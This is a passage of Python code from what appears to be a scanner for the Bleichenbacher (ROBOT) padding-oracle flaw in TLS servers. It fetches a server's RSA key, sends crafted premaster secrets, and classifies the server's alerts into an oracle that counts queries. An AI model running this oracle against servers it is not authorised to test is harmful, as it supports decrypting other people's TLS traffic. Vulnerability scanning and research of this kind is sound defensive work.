def get_rsa_from_server(server, port):
    def is_ip_address(value):
        try:
            ipaddress.ip_address(value)
            return True
        except ValueError:
            return False

    def connect_once(use_sni=True, allow_legacy_renegotiation=False):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("RSA")
        if allow_legacy_renegotiation and hasattr(ssl, "OP_LEGACY_SERVER_CONNECT"):
            ctx.options |= ssl.OP_LEGACY_SERVER_CONNECT
        with socket.create_connection((server, port)) as sock:
            server_hostname = server if use_sni else None
            with ctx.wrap_socket(sock, server_hostname=server_hostname) as ssock:
                cert_raw = ssock.getpeercert(binary_form=True)
                cert_dec = x509.load_der_x509_certificate(cert_raw, default_backend())
                return (
                    ssock.cipher(),
                    cert_dec.public_key().public_numbers().n,
                    cert_dec.public_key().public_numbers().e,
                    use_sni,
                    allow_legacy_renegotiation,
                )

    supports_legacy_reneg_flag = hasattr(ssl, "OP_LEGACY_SERVER_CONNECT")
    default_use_sni = not is_ip_address(server)
    attempts = [("default", default_use_sni, False)]
    attempted = set()
    last_ssl_error = None

    try:
        while attempts:
            attempt_label, use_sni, allow_legacy_renegotiation = attempts.pop(0)
            key = (use_sni, allow_legacy_renegotiation)
            if key in attempted:
                continue
            attempted.add(key)
            if attempt_label != "default" and not args.quiet:
                print(f"Retrying TLS handshake ({attempt_label})")
            try:
                return connect_once(
                    use_sni=use_sni,
                    allow_legacy_renegotiation=allow_legacy_renegotiation,
                )
            except ssl.SSLError as e:
                last_ssl_error = e
                error_str = str(e)
                if "TLSV1_UNRECOGNIZED_NAME" in error_str and use_sni:
                    attempts.append(("without SNI", False, allow_legacy_renegotiation))
                if (
                    "UNSAFE_LEGACY_RENEGOTIATION_DISABLED" in error_str
                    and not allow_legacy_renegotiation
                    and supports_legacy_reneg_flag
                ):
                    attempts.append(("with legacy renegotiation", use_sni, True))
                    if use_sni:
                        attempts.append(("without SNI and with legacy renegotiation", False, True))
        if last_ssl_error is not None:
            raise last_ssl_error
    except ssl.SSLError as e:
        if not args.quiet:
            print("Cannot connect to server: %s" % e)
            print("Server does not seem to allow connections with TLS_RSA (this is ideal).")
            if "TLSV1_UNRECOGNIZED_NAME" in str(e):
                print("Hint: server rejected the SNI name. This script now retries without SNI.")
            if "UNSAFE_LEGACY_RENEGOTIATION_DISABLED" in str(e):
                print("Hint: server uses legacy renegotiation and OpenSSL blocked it.")
        if args.csv:
            # TODO: We could add an extra check that the server speaks TLS without RSA
            print("NORSA,%s,%s,,,,,,,," % (args.host, ip))
        # s.close()
        sys.exit(0)
    except (ConnectionRefusedError, socket.timeout) as e:
        if not args.quiet:
            print("Cannot connect to server: %s" % e)
            print("There seems to be no TLS on this host/port.")
        if args.csv:
            print("NOTLS,%s,%s,,,,,,,," % (args.host, ip))
        sys.exit(0)


def oracle(pms, messageflow=False):
    global cke_version
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if not enable_fastopen:
            s.connect((ip, args.port))
            s.sendall(ch)
        else:
            s.sendto(ch, MSG_FASTOPEN, (ip, args.port))
        s.settimeout(timeout_flow if messageflow else timeout_standard)
        buf = bytearray.fromhex("")
        i = 0
        bend = 0
        while True:
            # we try to read twice
            while i + 5 > bend:
                buf += s.recv(4096)
                bend = len(buf)
            # this is the record size
            psize = buf[i + 3] * 256 + buf[i + 4]
            # if the size is 2, we received an alert
            if (psize == 2):
                # Print the alert and close the connection
                alert_level = buf[i+5] # Example: 2 = fatal
                alert_description = buf[i+6] # Example: 40 = handshake_failure
                s.close()
                return ("Alert(%i, %i) after ClientHello" % (alert_description, alert_level))
            # try to read further record data
            while i + psize + 5 > bend:
                buf += s.recv(4096)
                bend = len(buf)
            # check whether we have already received a ClientHelloDone
            if (buf[i + 5] == 0x0e) or (buf[bend - 4] == 0x0e):
                break
            i += psize + 5
        cke_version = buf[9:11]
        s.send(bytearray(b'\x16') + cke_version)
        s.send(cke_2nd_prefix)
        s.send(pms)
        if not messageflow:
            s.send(bytearray(b'\x14') + cke_version + ccs)
            s.send(bytearray(b'\x16') + cke_version + enc)
        try:
            alert = s.recv(4096)
            s.close()
            if len(alert) == 0:
                # return "No response"
                return ("No data received from server")
            if alert[0] == 0x15:
                if len(alert) < 7:
                    return ("TLS alert was truncated (%s)" % (repr(alert)))
                return ("TLS alert %i of length %i" % (alert[6], len(alert)))
                # return ("TLS alert %i" % alert[6])
            else:
                return "Received something other than an alert (%s)" % (alert[0:10])
        except ConnectionResetError as e:
            s.close()
            # return "No response"
            return "ConnectionResetError"
        except socket.timeout:
            s.close()
            # return "No response"
            return ("Timeout waiting for alert")
        s.close()
    except Exception as e:
        # exc_type, exc_obj, exc_tb = sys.exc_info()
        # print("line %i", exc_tb.tb_lineno)
        # print ("Exception received: " + str(e))
        s.close()
        return str(e)


def BleichenbacherOracle(cc):
    global count
    global countvalid
    count = count + 1
    if count % 1000 == 0:
        print(count, "oracle queries")
    tmp = hex(cc).rstrip("L").lstrip("0x").rjust(modulus_bits // 4, '0')
    pms = bytearray.fromhex(tmp)
    o = oracle(pms, messageflow=flow)
    if o == oracle_good:
        # Query the oracle again to make sure it is real...
        o = oracle(pms, messageflow=flow)
        if o == oracle_good:
            countvalid += 1
            return True
        else:
            print("Inconsistent result from oracle.")
            return False
    else:
        return False


